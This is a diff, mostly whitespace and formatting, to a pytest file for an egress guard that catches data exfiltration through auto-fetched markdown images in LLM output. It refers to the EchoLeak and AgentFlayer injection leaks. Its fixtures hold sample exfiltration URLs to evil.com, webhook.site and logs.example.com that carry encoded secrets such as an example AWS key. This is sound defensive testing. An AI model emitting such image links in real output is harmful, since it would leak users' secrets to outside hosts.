@@ -5,6 +5,7 @@ Covers the auto-fetched-markdown-image class of leak (EchoLeak / AgentFlayer /
 Notion) and its variants, plus false-positive controls on benign output.
 No LLM required.
 """
+
 import pytest
 
 from jataayu.guards.egress import EgressChannelGuard, EgressConfig
@@ -26,6 +27,7 @@ def guard_allow():
 # ---------------------------------------------------------------------------
 # Exfiltration channels — must be caught
 # ---------------------------------------------------------------------------
+
 
 class TestExfilChannels:
     def test_markdown_image_data_carrying_query(self, guard):
@@ -75,6 +77,7 @@ class TestExfilChannels:
 
     def test_secret_base64_in_url_detected(self, guard):
         import base64
+
         secret = "AKIAIOSFODNN7EXAMPLE"
         enc = base64.b64encode(secret.encode()).decode().rstrip("=")
         text = f"![x](https://logs.example.com/e?k={enc})"
@@ -90,6 +93,7 @@ class TestExfilChannels:
 # ---------------------------------------------------------------------------
 # Benign output — must NOT be flagged (false-positive control)
 # ---------------------------------------------------------------------------
+
 
 class TestNoFalsePositives:
     def test_plain_text_safe(self, guard):
@@ -127,6 +131,7 @@ class TestNoFalsePositives:
 # Sanitization — offending URLs neutralized, text preserved
 # ---------------------------------------------------------------------------
 
+
 class TestSanitize:
     def test_sanitize_removes_exfil_image(self, guard):
         text = "Done! ![x](https://webhook.site/abc?d=SECRETDATA1234567890)"
@@ -148,6 +153,7 @@ class TestSanitize:
 # ---------------------------------------------------------------------------
 # Integration with OutboundGuard
 # ---------------------------------------------------------------------------
+
 
 class TestOutboundIntegration:
     def test_outbound_guard_catches_egress(self):
@@ -174,10 +180,12 @@ class TestOutboundIntegration:
         assert r.is_safe
 
     def test_outbound_allowlist_passthrough(self):
-        g = OutboundGuard(PrivacyConfig(
-            use_llm=False,
-            egress_allowed_domains=["mycdn.com"],
-        ))
+        g = OutboundGuard(
+            PrivacyConfig(
+                use_llm=False,
+                egress_allowed_domains=["mycdn.com"],
+            )
+        )
         r = g.check("![logo](https://mycdn.com/logo.png)", surface="public")
         assert r.is_safe
 
@@ -185,6 +193,7 @@ class TestOutboundIntegration:
 # ---------------------------------------------------------------------------
 # Dict API
 # ---------------------------------------------------------------------------
+
 
 class TestDictApi:
     def test_api_blocks_beacon(self):
@@ -233,11 +242,11 @@ BENIGN_URLS = [
 ]
 
 EXFIL_URLS = [
-    "https://evil.com/aGVsbG8gd29ybGQgc2VjcmV0a2V5QUtJQUlXQVpWMjk/x",   # base64 in path
-    "https://evil.com/da39a3ee5e6b4b0d3255bfef95601890afd80709",        # 40-char hex digest
-    "https://evil.com/AKIAIOSFODNN7EXAMPLEwJalrXUtnFEMI",              # mixed-case key blob
-    "https://evil.com/zk3n-8qvx-7t2m-rl9p-c4hd-y6fj-b5sg-xna2-mq7v",    # hyphen-chunked payload
-    "https://evil.com/log?d=QUtJQUlPU0ZPRE5ON0VYQU1QTEUgc2VjcmV0",      # long query
+    "https://evil.com/aGVsbG8gd29ybGQgc2VjcmV0a2V5QUtJQUlXQVpWMjk/x",  # base64 in path
+    "https://evil.com/da39a3ee5e6b4b0d3255bfef95601890afd80709",  # 40-char hex digest
+    "https://evil.com/AKIAIOSFODNN7EXAMPLEwJalrXUtnFEMI",  # mixed-case key blob
+    "https://evil.com/zk3n-8qvx-7t2m-rl9p-c4hd-y6fj-b5sg-xna2-mq7v",  # hyphen-chunked payload
+    "https://evil.com/log?d=QUtJQUlPU0ZPRE5ON0VYQU1QTEUgc2VjcmV0",  # long query
 ]
 
 
